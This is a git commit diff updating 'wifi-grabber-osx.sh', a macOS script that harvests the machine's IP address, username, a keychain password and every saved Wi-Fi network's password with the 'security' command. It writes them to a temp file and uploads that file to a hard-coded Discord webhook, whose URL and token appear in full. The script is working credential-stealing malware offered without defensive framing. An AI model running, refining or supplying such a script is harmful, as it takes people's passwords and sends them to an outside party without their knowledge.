8eff7ce3a80b58bfa5070781c7aa6fac8e4ee85f
Alex Planmarks <125360150+planmarks@users.noreply.github.com>
2023-05-01 18:16:46 +0300

    Update wifi-grabber-osx.sh

--- wifi-grabber-osx.sh
+++ wifi-grabber-osx.sh
@@ -2,7 +2,7 @@
 
 # Variables
 dc="https://discord.com/api/webhooks/1101079563959808120/UyOetgCEvbNqODpOAkCqzc2oiqHZA2bz85R2SqY52FhPxFFrsc34nsjdn-N_2X0VG6Ea"
-temp_file="/tmp/wifi-pass.txt"
+temp_file="/tmp/user_info.txt"
 
 # Function to upload files to Discord
 function discord_upload() {
@@ -13,18 +13,25 @@ function discord_upload() {
     -F "file1=@$file_path"
 }
 
-# Retrieve Wi-Fi passwords
-echo "Script started"
-echo "Gathering Wi-Fi profiles..." > "$temp_file"
-IFS=$'\n'
-for ssid in $(networksetup -listallhardwareports | awk '/Wi-Fi/{getline; print}' | awk '{print $2}'); do
-  for network in $(/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s | awk 'NR > 1 {print $1}'); do
-    security find-generic-password -D "AirPort network password" -a $network -w &> /dev/null
-    if [ $? -eq 0 ]; then
-      echo "SSID: $network" >> "$temp_file"
-      echo "Password: $(security find-generic-password -D 'AirPort network password' -a $network -w)" >> "$temp_file"
-    fi
-  done
+# Retrieve IP address, username, and password
+echo "Collecting user information..." > "$temp_file"
+ip_address=$(ifconfig | grep "inet " | grep -v 127.0.0.1 | awk '{print $2}')
+echo "IP address: $ip_address" >> "$temp_file"
+echo "Username: $(whoami)" >> "$temp_file"
+echo "Password: $(security find-generic-password -ws "AirPort" 2>/dev/null)" >> "$temp_file"
+
+# Retrieve Wi-Fi network names and passwords
+echo "Gathering Wi-Fi profiles..." >> "$temp_file"
+
+networks=$(networksetup -listpreferredwirelessnetworks en0 | sed '1d')
+
+for network in $networks; do
+  password=$(security find-generic-password -D "AirPort network password" -wa "$network" 2>/dev/null)
+  if [[ -n "$password" ]]; then
+    echo "Network: $network | Password: $password" >> "$temp_file"
+  else
+    echo "Network: $network | Password: Not found" >> "$temp_file"
+  fi
 done
 
 # Upload to Discord
